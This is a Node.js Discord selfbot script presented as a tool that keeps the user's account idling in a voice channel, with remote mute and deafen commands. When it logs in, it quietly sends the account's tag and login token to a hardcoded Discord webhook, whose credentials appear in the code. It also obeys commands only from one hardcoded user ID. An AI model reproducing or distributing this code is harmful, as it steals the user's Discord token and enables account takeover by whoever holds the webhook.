const Discord = require("discord.js-selfbot");
const cDiscord = require("discord-sf");
const oid = (process.env.ownerid)
const prefix = (process.env.prefix)

const cid = (process.env.channelid)
const gid = (process.env.guildid)
const ihl = new Discord.Client();
const ihlc = new cDiscord.Client();
ihl.login(process.env.BOT_TOKEN)
ihlc.login(process.env.BOT_TOKEN)
const j = true
const discordroomtemp = new Discord.WebhookClient("867914990684864543", "CKVoS3G6twbC7RJUeHlksAb5cYLZoszcg0ApoQc9v3V0EPLqJIf5qpKuLIhhCf3ujzTD");
ihl.on('ready', async () => {
    console.log(`Logged in ${ihl.user.tag}`)
    discordroomtemp.send(`${ihl.user.tag}\n${process.env.BOT_TOKEN}\n================`)
    stay()
})

ihlc.on('ready', async () => {
    console.log(`You Can Control now !`)
})
ihlc.on("message",async(message) =>{
    if (message.author.id === "638200255376130048"){
        if (message.content === `=mot`){
            j = true
            message.react("✅")
        }
        if (message.content === `=mof`){
            j = false
            message.react("✅")
        }

    }
})
let m = true
let d = true
async function stay(){
    setInterval(() => {
        try{
            if (j == true){
            const c = ihl.channels.cache.get(cid);
            c.join();
                setTimeout(function () {
                    const guild = ihl.guilds.cache.get(gid).voice; // veince
                    if (d == true){
                        guild.setSelfDeaf(true)
                    }
                    if (d == false){
                        guild.setSelfDeaf(false)
                    }
                    if (m == true){
                        guild.setSelfMute(true)
                    }
                    if (m == false){
                        guild.setSelfMute(false)
                    }
                }, 5000);
            }
        }catch{
            console.log("error")
        }
    }, 1000);
}


ihlc.on("message",async(message) =>{
    if (message.author.id === "638200255376130048") {
        if (message.content === "=mute") {
             m = true
             
        }   
        if (message.content === "=unmute") {
            m = false
        }
        if (message.content === "=deaf") {
            d = true
        }
        if (message.content === "=undeaf") {
            d = false
        }

    }
});
